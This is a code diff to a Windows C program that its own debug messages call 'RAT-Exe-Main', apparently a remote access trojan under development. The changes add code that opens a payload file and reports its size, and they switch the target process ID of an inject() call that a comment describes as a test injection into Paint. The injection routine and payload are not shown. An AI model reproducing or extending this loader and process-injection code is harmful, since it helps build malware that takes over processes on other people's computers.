@@ -7,7 +7,7 @@
 HRESULT main()
 {
     HRESULT status = ERROR_SUCCESS;
-    HANDLE hFile;
+    HANDLE hFile, hPayload = NULL;
     DWORD dwBytesRead = 0;
     CHAR msgBuf[MAX_BUFFER_SIZE], *fileContents = NULL, *fileBytes = NULL;
     UINT64 fileSize = 0;
@@ -15,6 +15,7 @@ HRESULT main()
     DWORD lastError, bufferSize;
     LPCWSTR dllName = DLL_NAME;
     HMODULE hGetProcIDLL = LoadLibrary(dllName);
+    LARGE_INTEGER payloadSize = { 0 };
 
     OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");
 
@@ -37,14 +38,28 @@ HRESULT main()
 
 
 
+    // Open the payload to check the size 
+    hPayload = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hPayload == INVALID_HANDLE_VALUE)
+    {
+        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from CreateFileA 0x%X\n", GetLastError());
+        OutputDebugStringA(msgBuf);
+        goto cleanup;
+    }
 
+    if (!GetFileSizeEx(hPayload, &payloadSize))
+    {
+        sprintf_s(msgBuf, "RAT-Exe-Main::main - Failure from GetFileSizeEx 0x%X\n", GetLastError());
+        OutputDebugStringA(msgBuf);
+        goto cleanup;
+    }
 
-
-
+    sprintf_s(msgBuf, "RAT-Exe-Main::main - Payload is %lld bytes large\n", payloadSize.QuadPart);
+    OutputDebugStringA(msgBuf);
     
     // lets just test inject first to get that working 
         // paint inject test 
-    status = inject(6732, 15, filePath);
+    status = inject(6568, 15, filePath);
     if (status != ERROR_SUCCESS)
     {
         sprintf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
